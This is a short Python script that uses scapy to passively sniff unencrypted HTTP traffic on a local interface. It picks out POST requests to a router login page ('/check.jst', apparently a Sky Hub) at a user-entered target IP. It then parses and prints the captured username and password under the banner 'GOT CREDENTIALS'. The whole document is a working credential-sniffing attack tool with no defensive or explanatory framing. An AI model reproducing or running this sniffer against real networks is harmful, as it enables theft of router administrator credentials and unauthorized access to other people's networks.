import logging
from scapy.all import *

logging.getLogger('scapy').setLevel(logging.ERROR)

def http_header(packet):
        http_packet=str(packet)
        if ip in http_packet:
            if "/check.jst" in http_packet:
                if "password" in http_packet:
                    if "POST" in http_packet:
                        return POST_print(http_packet)

def POST_print(packet1):
    if "username=" in packet1:
        packet1 = packet1.replace('b"', '')
        packet1 = packet1.replace('"', '')
        packet1 = packet1.replace("b'", "")
        packet1 = packet1.replace("'", "")
        packet1 = packet1.replace("&", " ")
        packet1 = packet1.replace("password=", "")
        if "username=" in packet1:
            data = packet1.split('username=',1)[1].split('\r',1)[0]
            print("[+] GOT CREDENTIALS: " + data)

global ip
ip = input("[+] Enter target SKYHUB IP Address: ")
print("[+] LISTENING FOR PACKETS...")
sniff(iface='enp4s0', prn=http_header, filter="tcp port 80")
